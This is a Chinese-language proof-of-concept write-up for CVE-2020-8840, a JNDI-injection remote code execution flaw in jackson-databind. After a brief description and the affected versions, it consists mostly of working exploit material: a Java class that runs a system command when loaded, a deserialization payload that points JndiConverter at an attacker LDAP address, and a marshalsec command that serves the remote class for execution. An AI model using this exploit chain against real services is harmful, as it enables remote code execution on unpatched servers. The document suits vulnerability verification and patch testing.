## jackson-databind JNDI注入导致的远程代码执行漏洞(CVE-2020-8840)

### 1. 漏洞说明   
jackson-databind新版本中修复了一个由JNDI注入导致的远程代码执行漏洞CVE-2020-8840。受影响版本的 jackson-databind 中由于缺少某些xbean-reflect/JNDI黑名单类，如org.apache.xbean.propertyeditor.JndiConverter，可导致攻击者使用JNDI注入的方式实现远程代码执行

### 2. 影响版本
2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2  

### 3. 漏洞验证
 
Exploit代码：  

	public class Calcwin{
    public Calcwin(){
        try{
            Runtime.getRuntime().exec("cmd.exe /c calc");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Calcwin e = new Calcwin();
    }
	}
	

验证代码：  

	package com.snowsec0.jackson;
	import com.fasterxml.jackson.databind.ObjectMapper;
	import java.io.IOException;

	public class executepoc {
	
		public static void main(String[] args) {
		
			ObjectMapper mapper = new ObjectMapper();

        	mapper.enableDefaultTyping();

        	String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://ip:1389/Ps\"}]";

        	try {
            	mapper.readValue(json, Object.class);
        	} catch (IOException e) {
            	e.printStackTrace();
        	}
        
		
			System.out.print("CVE-2020-8840");
		}

	}

启动ldap：

	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip/#Calcwin